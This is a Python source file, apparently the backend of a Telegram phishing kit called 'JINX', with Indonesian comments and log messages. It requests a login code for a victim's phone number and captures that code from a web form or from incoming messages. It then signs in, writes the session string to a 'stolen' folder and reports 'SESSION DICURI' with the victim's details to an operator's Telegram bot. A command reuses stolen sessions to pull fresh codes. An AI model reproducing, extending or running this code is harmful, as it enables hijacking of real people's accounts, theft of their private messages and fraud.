from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re
import logging

# Aktifkan logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI()

API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')

@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']
    
    logger.info(f"[+] Mulai listener untuk {phone}")

    # Buat client sementara
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    
    # PAKSA CONNECT DULU
    await temp.connect()
    if not await temp.is_user_authorized():
        logger.info(f"[+] Client belum login, kirim OTP...")
    else:
        logger.warning(f"[!] Client sudah login? (jarang terjadi)")

    try:
        # Kirim OTP
        sent = await temp.send_code_request(phone)
        logger.info(f"[+] OTP terkirim, hash: {sent.phone_code_hash}")
        
        # Simpan ke listening
        listening[phone] = {
            'client': temp,
            'hash': sent.phone_code_hash,
            'awaiting': True
        }

        # DELAY 2 DETIK BIAR CLIENT SIAP
        await asyncio.sleep(2)

        # PASANG LISTENER SETELAH SIAP
        @temp.on(events.NewMessage(incoming=True))
        async def otp_handler(event):
            text = event.message.message
            logger.info(f"[*] Pesan masuk dari {phone}: {text}")
            
            match = OTP_PATTERN.search(text)
            if match:
                code = match.group(1)
                logger.info(f"[+] OTP DITEMUKAN: {code}")
                await auto_login(phone, code, source="interceptor")
                # Hapus listener
                temp.remove_event_handler(otp_handler)

        # Kirim notif ke bot
        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
        
    except Exception as e:
        logger.error(f"[!] Gagal kirim OTP: {str(e)}")
        await client.send_message(CHAT_ID, f"Gagal kirim OTP ke `{phone}`: {str(e)}")
    
    return {"success": True}

@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    
    if phone in listening:
        await auto_login(phone, otp, source="web")
    return {"success": True}

async def auto_login(phone, code, source="unknown"):
    if phone not in listening:
        return
    
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']

    try:
        await temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await temp.get_me()
        session_str = temp.session.save()

        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(session_str)

        msg = f"""
OTP DITERIMA: `{code}` ({source.upper()})
SESSION DICURI!
User: {me.first_name}
Phone: `{phone}`
/login {phone}
        """.strip()
        await client.send_message(CHAT_ID, msg)
        del listening[phone]
        
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal login {phone}: {str(e)}")

# /new_otp
@client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
async def new_otp(event):
    phone = event.pattern_match.group(1)
    session_file = f"stolen/{phone.replace('+','')}.session"
    if not os.path.exists(session_file):
        await event.reply("Session nggak ada!")
        return
    
    session_str = open(session_file).read()
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await stolen.connect()
    await stolen.start()
    
    try:
        result = await stolen.send_code_request(phone)
        await event.reply(f"OTP BARU DIKIRIM KE `{phone}`")
        
        listening[phone] = {'client': stolen, 'hash': result.phone_code_hash}
        await asyncio.sleep(2)  # Delay
        
        @stolen.on(events.NewMessage(incoming=True))
        async def handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                code = match.group(1)
                await event.reply(f"OTP BARU: `{code}`")
                stolen.remove_event_handler(handler)
                
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX BOT HIDUP – OTP LANGSUNG MUNCUL!")
